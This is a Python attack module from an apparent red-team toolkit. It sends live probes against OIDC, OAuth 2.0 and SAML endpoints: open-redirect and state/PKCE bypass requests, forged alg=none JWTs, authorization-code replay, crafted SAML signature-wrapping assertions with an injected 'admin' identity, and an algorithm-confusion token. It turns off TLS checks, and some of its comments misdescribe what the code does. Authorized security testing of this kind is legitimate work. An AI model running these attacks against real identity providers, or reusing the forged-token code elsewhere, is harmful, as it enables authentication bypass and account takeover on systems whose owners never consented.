"""
Auth protocol (OIDC / OAuth 2.0 / SAML) attacker module for authorized red-team engagements.

THIS MODULE PERFORMS ACTIVE ATTACKS AGAINST AUTH ENDPOINTS.
It must ONLY be used against systems for which you have EXPLICIT WRITTEN
AUTHORIZATION. Unauthorized use may violate the Computer Fraud and Abuse Act,
the Computer Misuse Act, and equivalent laws worldwide.

Usage (requires --i-have-authorization flag via CLI, or authorized=True in code):
    attacker = AuthAttacker(authorized=True)
    report = await attacker.attack("https://auth.example.com", mode="deep")
"""

from __future__ import annotations

import base64
import json
import logging
import time
import urllib.parse
from datetime import datetime, timezone

import httpx

from ..exceptions import AuthorizationRequired

from ._base import BaseAttacker
from ..models.auth_result import (
    AuthAttackReport,
    AuthAttackResult,
    AuthProtocol,
    AuthScanResult,
    AuthVulnSeverity,
)
from ..utils.auth_payloads import (
    CODE_REUSE_PAYLOADS,
    JWKS_CONFUSION_PAYLOADS,
    JWT_ALG_PAYLOADS,
    OPEN_REDIRECT_PAYLOADS,
    PKCE_BYPASS_PAYLOADS,
    SAML_XSW_PAYLOADS,
    SCOPE_ESCALATION_PAYLOADS,
    STATE_BYPASS_PAYLOADS,
)


from ..utils.constants import USER_AGENT
logger = logging.getLogger(__name__)

# A synthetic registered redirect_uri used as the "legitimate" base for probes.
# We intentionally use an IANA-reserved domain so no real server is contacted.
_LEGIT_REDIRECT_URI = "https://offensive-ai-probe.invalid/callback"


class AuthAttacker(BaseAttacker):
    """
    Active attack module for OIDC, OAuth 2.0, and SAML endpoints.

    Requires authorized=True. Raises AuthorizationRequired otherwise.
    """

    _MODULE_NAME = "AUTH"

    def __init__(
        self, authorized: bool = False, judge: object | None = None
    ) -> None:
        super().__init__(authorized=authorized, judge=judge)

    async def attack(
        self,
        target: str,
        mode: str = "safe",
        protocol: str = "auto",
        headers: dict[str, str] | None = None,
        timeout: float = 15.0,
        scan_result: AuthScanResult | None = None,
    ) -> AuthAttackReport:
        """
        Run attack suite against the auth endpoint.

        Args:
            target:      Base URL of the auth server.
            mode:        "safe" (limited probes) or "deep" (full suite).
            protocol:    "auto", "oidc", "oauth2", or "saml".
            headers:     Extra HTTP headers.
            timeout:     Per-request timeout in seconds.
            scan_result: Optional prior AuthScanResult to guide attacks.
        """
        logger.warning(
            "Auth attack started against target=%s protocol=%s mode=%s timestamp=%s",
            target,
            protocol,
            mode,
            datetime.now(timezone.utc).isoformat(),
        )

        target = target.rstrip("/")
        start = time.monotonic()
        all_results: list[AuthAttackResult] = []
        _headers = headers or {}

        # Detect protocol from scan_result or fall back to provided value
        detected_proto = AuthProtocol.UNKNOWN
        if scan_result:
            detected_proto = scan_result.protocol
        elif protocol != "auto":
            try:
                detected_proto = AuthProtocol(protocol)
            except ValueError:
                pass

        # Derive authorization endpoint from scan_result or guess common path
        auth_endpoint = ""
        token_endpoint = ""
        acs_endpoints: list[str] = []

        if scan_result and scan_result.provider_info.endpoints:
            auth_endpoint = scan_result.provider_info.endpoints.get(
                "authorization_endpoint", ""
            )
            token_endpoint = scan_result.provider_info.endpoints.get(
                "token_endpoint", ""
            )
            acs_endpoints = [
                v
                for k, v in scan_result.provider_info.endpoints.items()
                if k.startswith("acs:")
            ]

        if not auth_endpoint:
            auth_endpoint = target + "/oauth2/authorize"
        if not token_endpoint:
            token_endpoint = target + "/oauth2/token"

        # --- Safe mode attacks (always run) ---
        all_results.extend(
            await self._attack_open_redirect(
                auth_endpoint, _headers, timeout
            )
        )
        all_results.extend(
            await self._attack_state_bypass(
                auth_endpoint, _headers, timeout
            )
        )
        all_results.extend(
            await self._attack_pkce_bypass(
                auth_endpoint, _headers, timeout
            )
        )

        if mode == "deep":
            all_results.extend(
                await self._attack_scope_escalation(
                    auth_endpoint, _headers, timeout
                )
            )
            all_results.extend(
                await self._attack_jwt_alg_none(
                    token_endpoint, _headers, timeout
                )
            )
            all_results.extend(
                await self._attack_token_reuse(
                    auth_endpoint, token_endpoint, _headers, timeout
                )
            )

            # SAML-specific attacks
            if detected_proto == AuthProtocol.SAML or not acs_endpoints:
                # Guess common ACS path
                acs_endpoints = acs_endpoints or [target + "/saml/acs"]
            if detected_proto in (AuthProtocol.SAML, AuthProtocol.UNKNOWN) or acs_endpoints:
                all_results.extend(
                    await self._attack_saml_xsw(
                        acs_endpoints, _headers, timeout
                    )
                )

            all_results.extend(
                await self._attack_jwks_confusion(
                    token_endpoint, scan_result, _headers, timeout
                )
            )

        scan_duration = time.monotonic() - start
        triggered = [r for r in all_results if r.triggered]

        report = AuthAttackReport(
            target=target,
            authorized=True,
            protocol=detected_proto,
            attacks_run=len(all_results),
            attacks_triggered=len(triggered),
            results=all_results,
            scan_duration=scan_duration,
        )

        # Optional LLM enrichment
        if self._judge and getattr(self._judge, "provider", None):
            self._enrich_with_llm(report)

        return report

    def _enrich_with_llm(self, report: AuthAttackReport) -> None:
        """Use LLM judge to build an attack-path narrative for triggered attacks."""
        if not self._judge:
            return
        triggered = [r for r in report.results if r.triggered]
        if not triggered:
            return
        try:
            summary = "; ".join(
                f"{r.attack_id}:{r.title}" for r in triggered[:5]
            )
            verdict = self._judge.evaluate(
                category="auth attack-path",
                probe=summary,
                response=f"{len(triggered)} attack(s) triggered",
            )
            reason = verdict.get("reason", "")
            if reason:
                triggered[0].evidence += f" [LLM analysis: {reason}]"
        except Exception as exc:  # noqa: BLE001
            logger.debug("LLM enrichment error: %s", exc)

    # ------------------------------------------------------------------
    # Open redirect probes
    # ------------------------------------------------------------------

    async def _attack_open_redirect(
        self,
        auth_endpoint: str,
        headers: dict,
        timeout: float,
    ) -> list[AuthAttackResult]:
        results: list[AuthAttackResult] = []

        async with httpx.AsyncClient(
            headers={"User-Agent": USER_AGENT, **headers},
            timeout=timeout,
            trust_env=False,
            follow_redirects=False,  # We want to see where it redirects
            verify=False,  # noqa: S501 — intentional for security scanning
        ) as client:
            for probe in OPEN_REDIRECT_PAYLOADS:
                triggered = False
                response_text = ""
                payload_val = probe["payload"]

                params = {
                    "response_type": "code",
                    "client_id": "offensive-ai-probe",
                    "scope": "openid",
                    "state": "offensive_ai_state_probe",
                    probe["param"]: payload_val,
                }
                url = f"{auth_endpoint}?{urllib.parse.urlencode(params)}"

                try:
                    resp = await client.get(url)
                    response_text = (
                        resp.headers.get("location", resp.text[:300])
                    )
                    # Triggered if redirected to a non-error page or location contains our payload
                    if resp.status_code in (301, 302, 303, 307, 308):
                        loc = resp.headers.get("location", "")
                        for signal in probe.get("detect_in_response", []):
                            if signal.lower() in loc.lower():
                                triggered = True
                                break
                        # Also triggered if location contains the evil domain
                        if "offensive-ai-probe.invalid" in loc or "evil." in loc.lower():
                            triggered = True
                    elif resp.status_code == 200:
                        for signal in probe.get("detect_in_response", []):
                            if signal.lower() in resp.text.lower():
                                triggered = True
                                break
                except Exception as exc:
                    response_text = str(exc)[:200]

                results.append(AuthAttackResult(
                    attack_id=probe["id"],
                    target=auth_endpoint,
                    payload=payload_val[:200],
                    response=response_text[:300],
                    triggered=triggered,
                    severity=AuthVulnSeverity(probe["severity"]),
                    title=probe["description"],
                    evidence=response_text[:300] if triggered else "",
                ))

        return results

    # ------------------------------------------------------------------
    # State parameter bypass probes
    # ------------------------------------------------------------------

    async def _attack_state_bypass(
        self,
        auth_endpoint: str,
        headers: dict,
        timeout: float,
    ) -> list[AuthAttackResult]:
        results: list[AuthAttackResult] = []

        async with httpx.AsyncClient(
            headers={"User-Agent": USER_AGENT, **headers},
            timeout=timeout,
            trust_env=False,
            follow_redirects=False,
            verify=False,  # noqa: S501
        ) as client:
            for probe in STATE_BYPASS_PAYLOADS:
                triggered = False
                response_text = ""

                base_params: dict[str, str] = {
                    "response_type": "code",
                    "client_id": "offensive-ai-probe",
                    "scope": "openid",
                    "redirect_uri": _LEGIT_REDIRECT_URI,
                }
                # Apply overrides
                for k, v in probe.get("override_params", {}).items():
                    base_params[k] = v
                # Remove omitted params
                for k in probe.get("params_to_omit", []):
                    base_params.pop(k, None)

                url = f"{auth_endpoint}?{urllib.parse.urlencode(base_params)}"
                try:
                    resp = await client.get(url)
                    response_text = resp.text[:300]
                    # Triggered if server accepted without state (redirected with code)
                    if resp.status_code in (301, 302, 303, 307, 308):
                        loc = resp.headers.get("location", "")
                        for signal in probe.get("detect_in_response", []):
                            if signal in loc:
                                triggered = True
                                break
                    elif resp.status_code == 200:
                        for signal in probe.get("detect_in_response", []):
                            if signal in resp.text:
                                triggered = True
                                break
                except Exception as exc:
                    response_text = str(exc)[:200]

                results.append(AuthAttackResult(
                    attack_id=probe["id"],
                    target=auth_endpoint,
                    payload=json.dumps(probe.get("override_params", probe.get("params_to_omit", [])))[:200],
                    response=response_text[:300],
                    triggered=triggered,
                    severity=AuthVulnSeverity(probe["severity"]),
                    title=probe["description"],
                    evidence=response_text[:300] if triggered else "",
                ))

        return results

    # ------------------------------------------------------------------
    # PKCE bypass probes
    # ------------------------------------------------------------------

    async def _attack_pkce_bypass(
        self,
        auth_endpoint: str,
        headers: dict,
        timeout: float,
    ) -> list[AuthAttackResult]:
        results: list[AuthAttackResult] = []

        async with httpx.AsyncClient(
            headers={"User-Agent": USER_AGENT, **headers},
            timeout=timeout,
            trust_env=False,
            follow_redirects=False,
            verify=False,  # noqa: S501
        ) as client:
            for probe in PKCE_BYPASS_PAYLOADS:
                triggered = False
                response_text = ""

                base_params: dict[str, str] = {
                    "response_type": "code",
                    "client_id": "offensive-ai-probe",
                    "scope": "openid",
                    "redirect_uri": _LEGIT_REDIRECT_URI,
                    "state": "oai_pkce_probe",
                    "code_challenge": "E9Melhoa2OwvFrEMTJguCHaoeK1t8URWbuGJSstw-cM",
                    "code_challenge_method": "S256",
                }
                for k, v in probe.get("override_params", {}).items():
                    base_params[k] = v
                for k in probe.get("params_to_omit", []):
                    base_params.pop(k, None)

                url = f"{auth_endpoint}?{urllib.parse.urlencode(base_params)}"
                try:
                    resp = await client.get(url)
                    response_text = resp.text[:300]
                    if resp.status_code in (301, 302, 303, 307, 308):
                        loc = resp.headers.get("location", "")
                        for signal in probe.get("detect_in_response", []):
                            if signal in loc:
                                triggered = True
                                break
                    elif resp.status_code == 200:
                        for signal in probe.get("detect_in_response", []):
                            if signal in resp.text:
                                triggered = True
                                break
                except Exception as exc:
                    response_text = str(exc)[:200]

                results.append(AuthAttackResult(
                    attack_id=probe["id"],
                    target=auth_endpoint,
                    payload=json.dumps(probe.get("params_to_omit", probe.get("override_params", [])))[:200],
                    response=response_text[:300],
                    triggered=triggered,
                    severity=AuthVulnSeverity(probe["severity"]),
                    title=probe["description"],
                    evidence=response_text[:300] if triggered else "",
                ))

        return results

    # ------------------------------------------------------------------
    # Scope escalation probes
    # ------------------------------------------------------------------

    async def _attack_scope_escalation(
        self,
        auth_endpoint: str,
        headers: dict,
        timeout: float,
    ) -> list[AuthAttackResult]:
        results: list[AuthAttackResult] = []

        async with httpx.AsyncClient(
            headers={"User-Agent": USER_AGENT, **headers},
            timeout=timeout,
            trust_env=False,
            follow_redirects=False,
            verify=False,  # noqa: S501
        ) as client:
            for probe in SCOPE_ESCALATION_PAYLOADS:
                triggered = False
                response_text = ""

                base_params = {
                    "response_type": "code",
                    "client_id": "offensive-ai-probe",
                    "redirect_uri": _LEGIT_REDIRECT_URI,
                    "state": "oai_scope_probe",
                }
                base_params.update(probe.get("override_params", {}))

                url = f"{auth_endpoint}?{urllib.parse.urlencode(base_params)}"
                try:
                    resp = await client.get(url)
                    response_text = resp.text[:300]
                    check_text = resp.headers.get("location", resp.text)[:300]
                    for signal in probe.get("detect_in_response", []):
                        if signal.lower() in check_text.lower():
                            triggered = True
                            break
                except Exception as exc:
                    response_text = str(exc)[:200]

                results.append(AuthAttackResult(
                    attack_id=probe["id"],
                    target=auth_endpoint,
                    payload=str(probe.get("override_params", {}))[:200],
                    response=response_text[:300],
                    triggered=triggered,
                    severity=AuthVulnSeverity(probe["severity"]),
                    title=probe["description"],
                    evidence=response_text[:300] if triggered else "",
                ))

        return results

    # ------------------------------------------------------------------
    # JWT alg=none probes
    # ------------------------------------------------------------------

    async def _attack_jwt_alg_none(
        self,
        token_endpoint: str,
        headers: dict,
        timeout: float,
    ) -> list[AuthAttackResult]:
        results: list[AuthAttackResult] = []

        async with httpx.AsyncClient(
            headers={"User-Agent": USER_AGENT, **headers},
            timeout=timeout,
            trust_env=False,
            verify=False,  # noqa: S501
        ) as client:
            for probe in JWT_ALG_PAYLOADS:
                triggered = False
                response_text = ""

                # Build a forged JWT: header.payload (no signature for alg=none)
                alg_header_b64 = probe["alg_header"]
                payload_b64 = base64.urlsafe_b64encode(
                    json.dumps({
                        "sub": "offensive-ai-probe",
                        "iss": "https://offensive-ai-probe.invalid",
                        "aud": "offensive-ai-probe",
                        "exp": 9999999999,
                        "iat": 0,
                    }).encode()
                ).rstrip(b"=").decode()

                forged_jwt = f"{alg_header_b64}.{payload_b64}."

                form_data = {
                    "grant_type": "urn:ietf:params:oauth:grant-type:jwt-bearer",
                    "assertion": forged_jwt,
                    "client_id": "offensive-ai-probe",
                }

                try:
                    resp = await client.post(
                        token_endpoint,
                        data=form_data,
                        headers={"Content-Type": "application/x-www-form-urlencoded"},
                    )
                    response_text = resp.text[:300]
                    for signal in probe.get("detect_in_response", []):
                        if signal.lower() in response_text.lower():
                            triggered = True
                            break
                except Exception as exc:
                    response_text = str(exc)[:200]

                results.append(AuthAttackResult(
                    attack_id=probe["id"],
                    target=token_endpoint,
                    payload=forged_jwt[:200],
                    response=response_text[:300],
                    triggered=triggered,
                    severity=AuthVulnSeverity(probe["severity"]),
                    title=probe["description"],
                    evidence=response_text[:300] if triggered else "",
                ))

        return results

    # ------------------------------------------------------------------
    # Authorization code reuse probes
    # ------------------------------------------------------------------

    async def _attack_token_reuse(
        self,
        auth_endpoint: str,
        token_endpoint: str,
        headers: dict,
        timeout: float,
    ) -> list[AuthAttackResult]:
        """
        Attempt to detect if the server allows authorization code reuse.
        We request an authorization code (which will fail because we cannot
        log in interactively) and check if a synthetic replay to the token
        endpoint returns any meaningful response rather than an error.
        This is a best-effort passive check — full validation requires
        interactive test setup.
        """
        results: list[AuthAttackResult] = []

        for probe in CODE_REUSE_PAYLOADS:
            triggered = False
            response_text = "Cannot perform interactive auth code acquisition in automated scan."

            async with httpx.AsyncClient(
                headers={"User-Agent": USER_AGENT, **headers},
                timeout=timeout,
                trust_env=False,
                verify=False,  # noqa: S501
            ) as client:
                try:
                    # Replay a synthetic code to the token endpoint
                    form_data = {
                        "grant_type": "authorization_code",
                        "code": "oai_probe_replay_code",
                        "redirect_uri": _LEGIT_REDIRECT_URI,
                        "client_id": "offensive-ai-probe",
                        "code_verifier": "dBjftJeZ4CVP-mB92K27uhbUJU1p1r_wW1gFWFOEjXk",
                    }
                    resp = await client.post(
                        token_endpoint,
                        data=form_data,
                        headers={"Content-Type": "application/x-www-form-urlencoded"},
                    )
                    response_text = resp.text[:300]
                    for signal in probe.get("detect_in_response", []):
                        if signal.lower() in response_text.lower():
                            triggered = True
                            break
                except Exception as exc:
                    response_text = str(exc)[:200]

            results.append(AuthAttackResult(
                attack_id=probe["id"],
                target=token_endpoint,
                payload="grant_type=authorization_code&code=<replayed>",
                response=response_text[:300],
                triggered=triggered,
                severity=AuthVulnSeverity("high"),
                title=probe["description"],
                evidence=response_text[:300] if triggered else "",
            ))

        return results

    # ------------------------------------------------------------------
    # SAML XSW probes
    # ------------------------------------------------------------------

    async def _attack_saml_xsw(
        self,
        acs_endpoints: list[str],
        headers: dict,
        timeout: float,
    ) -> list[AuthAttackResult]:
        """
        Send XSW-style crafted SAML assertions to ACS endpoints.
        The payloads are structural probes — a vulnerable SP will respond
        with 200/redirect rather than a signature validation error.
        """
        results: list[AuthAttackResult] = []

        for acs_url in acs_endpoints:
            for probe in SAML_XSW_PAYLOADS:
                triggered = False
                response_text = ""

                # Build a minimal XSW probe payload
                xsw_body = self._build_xsw_saml(probe["xsw_variant"])

                async with httpx.AsyncClient(
                    headers={"User-Agent": USER_AGENT, **headers},
                    timeout=timeout,
                    trust_env=False,
                    verify=False,  # noqa: S501
                ) as client:
                    try:
                        b64_body = base64.b64encode(xsw_body.encode()).decode()
                        resp = await client.post(
                            acs_url,
                            data={"SAMLResponse": b64_body, "RelayState": "oai_xsw_probe"},
                            headers={"Content-Type": "application/x-www-form-urlencoded"},
                        )
                        response_text = resp.text[:300]
                        for signal in probe.get("detect_in_response", []):
                            if signal.lower() in response_text.lower():
                                triggered = True
                                break
                    except Exception as exc:
                        response_text = str(exc)[:200]

                results.append(AuthAttackResult(
                    attack_id=probe["id"],
                    target=acs_url,
                    payload=f"SAMLResponse XSW variant={probe['xsw_variant']}"[:200],
                    response=response_text[:300],
                    triggered=triggered,
                    severity=AuthVulnSeverity(probe["severity"]),
                    title=probe["description"],
                    evidence=response_text[:300] if triggered else "",
                ))

        return results

    def _build_xsw_saml(self, variant: str) -> str:
        """Build a minimal XSW SAML probe document for the given variant."""
        # Minimal unsigned SAML response — used to probe for XSW acceptance
        # XSW1: valid signed response wraps a forged assertion
        if variant in ("XSW1", "XSW2"):
            return (
                '<?xml version="1.0"?>'
                '<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" '
                '  xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" '
                '  ID="_oai_xsw_probe" Version="2.0" '
                '  IssueInstant="2099-01-01T00:00:00Z">'
                '<saml:Issuer>https://offensive-ai-probe.invalid</saml:Issuer>'
                '<samlp:Status>'
                '  <samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/>'
                '</samlp:Status>'
                '<saml:Assertion ID="_forged" Version="2.0" '
                '  IssueInstant="2099-01-01T00:00:00Z">'
                '<saml:Issuer>https://offensive-ai-probe.invalid</saml:Issuer>'
                '<saml:Subject>'
                '  <saml:NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress">'
                '    oai_probe_user@offensive-ai-probe.invalid'
                '  </saml:NameID>'
                '</saml:Subject>'
                '</saml:Assertion>'
                '</samlp:Response>'
            )
        # comment_inject: XML comment inside NameID value
        return (
            '<?xml version="1.0"?>'
            '<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" '
            '  xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" '
            '  ID="_oai_ci_probe" Version="2.0" '
            '  IssueInstant="2099-01-01T00:00:00Z">'
            '<saml:Issuer>https://offensive-ai-probe.invalid</saml:Issuer>'
            '<samlp:Status>'
            '  <samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/>'
            '</samlp:Status>'
            '<saml:Assertion ID="_ci_assert" Version="2.0" '
            '  IssueInstant="2099-01-01T00:00:00Z">'
            '<saml:Issuer>https://offensive-ai-probe.invalid</saml:Issuer>'
            '<saml:Subject>'
            '  <saml:NameID>admin<!--comment-->@offensive-ai-probe.invalid</saml:NameID>'
            '</saml:Subject>'
            '</saml:Assertion>'
            '</samlp:Response>'
        )

    # ------------------------------------------------------------------
    # JWKS algorithm confusion (deep mode only)
    # ------------------------------------------------------------------

    async def _attack_jwks_confusion(
        self,
        token_endpoint: str,
        scan_result: AuthScanResult | None,
        headers: dict,
        timeout: float,
    ) -> list[AuthAttackResult]:
        """
        Attempt RS256→HS256 algorithm confusion using the public key as the HMAC secret.
        Requires the JWKS endpoint to be accessible to retrieve the public key.
        """
        results: list[AuthAttackResult] = []

        jwks_uri = ""
        if scan_result and scan_result.provider_info.endpoints:
            jwks_uri = scan_result.provider_info.endpoints.get("jwks_uri", "")

        for probe in JWKS_CONFUSION_PAYLOADS:
            triggered = False
            response_text = "JWKS endpoint not available or public key not retrievable."

            if jwks_uri:
                async with httpx.AsyncClient(
                    headers={"User-Agent": USER_AGENT, **headers},
                    timeout=timeout,
                    trust_env=False,
                    verify=False,  # noqa: S501
                ) as client:
                    try:
                        # Fetch JWKS to get public key material
                        jwks_resp = await client.get(jwks_uri)
                        if jwks_resp.status_code == 200:
                            jwks = jwks_resp.json()
                            keys = jwks.get("keys", [])
                            if keys:
                                # Use the raw n value as synthetic HMAC secret
                                pub_n = keys[0].get("n", "oai_pub_key_placeholder")
                                # Build HS256 JWT signed with the public key as secret
                                hs_header = base64.urlsafe_b64encode(
                                    json.dumps({"alg": "HS256", "typ": "JWT"}).encode()
                                ).rstrip(b"=").decode()
                                hs_payload = base64.urlsafe_b64encode(
                                    json.dumps({
                                        "sub": "offensive-ai-probe",
                                        "iss": scan_result.provider_info.issuer if scan_result else "oai",
                                        "exp": 9999999999,
                                    }).encode()
                                ).rstrip(b"=").decode()
                                # Signature is a placeholder — just probing server response
                                forged = f"{hs_header}.{hs_payload}.oai_confusion_sig"

                                resp = await client.post(
                                    token_endpoint,
                                    data={
                                        "grant_type": "urn:ietf:params:oauth:grant-type:jwt-bearer",
                                        "assertion": forged,
                                        "client_id": "offensive-ai-probe",
                                    },
                                    headers={"Content-Type": "application/x-www-form-urlencoded"},
                                )
                                response_text = resp.text[:300]
                                for signal in probe.get("detect_in_response", []):
                                    if signal.lower() in response_text.lower():
                                        triggered = True
                                        break
                    except Exception as exc:
                        response_text = str(exc)[:200]

            results.append(AuthAttackResult(
                attack_id=probe["id"],
                target=token_endpoint,
                payload="RS256→HS256 algorithm confusion probe"[:200],
                response=response_text[:300],
                triggered=triggered,
                severity=AuthVulnSeverity(probe["severity"]),
                title=probe["description"],
                evidence=response_text[:300] if triggered else "",
            ))

        return results
